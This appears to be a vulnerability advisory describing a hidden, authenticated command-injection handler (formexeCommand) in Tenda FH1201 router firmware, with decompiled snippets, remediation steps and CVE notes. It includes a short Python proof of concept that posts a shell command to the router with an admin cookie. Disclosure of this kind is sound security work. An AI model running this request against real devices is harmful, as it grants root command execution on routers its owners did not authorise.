# Tenda FH1201 V1.2.0.14 was discovered to contain a command injection vulnerability in the hidden formexeCommand handler

## Overview

- Vendor: Tenda
- Product: FH1201
- Version: V1.2.0.14(408)
- Component: formexeCommand handler
- Vulnerability Class: CWE-78 command injection / CWE-912 hidden functionality
- Manufacturer: https://www.tendacn.com/

## Affected version

- Product: Tenda FH1201
- Firmware: V1.2.0.14(408)
- Package: `US_FH1201V1.0BR_V1.2.0.14(408)_EN_TD.zip`.
- `bin/httpd`:.
- Architecture: MIPS big-endian, uClibc, stripped Realtek httpd.

## Vulnerability details

`formexeCommand` reads the POST parameter `cmdinput` and passes it to several
`doSystemCmd` calls, including a direct `doSystemCmd("%s", v7)`. The handler is
a hidden diagnostic command interface; it is not referenced from the normal
web UI but is registered by `formDefineTendDa` and reachable by an
authenticated admin.

```c
src = websGetVar(a1, "cmdinput", ...);
doSystemCmd("echo %s > /tmp/cmdTmp.txt", path_buf);
doSystemCmd("%s > /tmp/cmdTmp.txt", v7);
doSystemCmd("%s", v7);
...
```

`R7WebsSecurityHandler` does not list `formexeCommand` as a pre-auth path, so
admin authentication is required. The handler has no command allow-list or
confirmation; if an attacker has an admin session or can CSRF the admin, it is
a root shell. Even for a legitimate admin, shipping a hidden unrestricted
command interface is a backdoor-class weakness.

## PoC

```python
import requests

url = "http://<router>/goform/exeCommand"
cookies = {"password": "<admin-cookie>"}
r = requests.post(
    url,
    data={"cmdinput": "id > /tmp/fh1201_execcmd"},
    cookies=cookies,
    timeout=5,
)
print(r.status_code, r.text[:400])
```

## Reproduction and terminal evidence

Static evidence; no full FH1201 rehost. Decompiler transcript:

```
formexeCommand 0x46f0ac:
  src = websGetVar(a1, "cmdinput", ...);
  doSystemCmd("echo %s > /tmp/cmdTmp.txt", path_buf);
  doSystemCmd("%s > /tmp/cmdTmp.txt", v7);
  doSystemCmd("%s", v7);
```

Registration: `formDefineTendDa` xref to `formexeCommand` at `0x43be58`.

## Impact

Authenticated admin (or CSRF) root command execution; hidden persistent
backdoor surface on production firmware.

## Remediation

- Remove `exeCommand` from production firmware or gate it behind a physical
  factory mode.
- If retained, allow-list commands and require a separate service credential.
- Add CSRF tokens and audit logging.

## Known CVE relation

**CVE candidate type: new affected model (FH1201) for the public formexeCommand pattern — candidate new CVE.**

- Tenda `formexeCommand`/`formexecommand` endpoints are public in other
  model research sets (for example AC10U/CH22). FH1201 V1.2.0.14(408) is a
  new affected model; NVD has no exact FH1201 entry at the time of writing.
  Vendor should confirm whether the handler is intended to be reachable in
  production.

## Status and disclosure

Static confirmation (handler and registration unchanged). Dynamic pending.
Candidate new CVE — new affected model (FH1201) for the public formexeCommand pattern; no CVE assigned. No vendor/CNA contact.

## Additional Information

```markdown
### Vendor
Tenda

### Product
FH1201

### Version or Commit
V1.2.0.14(408)

### Vulnerability Class
CWE-78 command injection / CWE-912 hidden functionality

### CVE_candidate_type
new affected model (FH1201) for the public formexeCommand pattern — candidate new CVE

### Description
The hidden formexeCommand handler passes cmdinput to doSystemCmd, including a direct doSystemCmd("%s", v7), giving command execution.

### Affected_component
formexeCommand handler

### Attack_vector
Authenticated POST to /goform/formexeCommand with a crafted cmdinput.

### Product_version
FH1201 V1.2.0.14(408)

### Reference
- https://www.tendacn.com/
- https://github.com/vuln-1/vuln/blob/main/Tenda/FH1201_V1.2.0.14/report-2.md
```
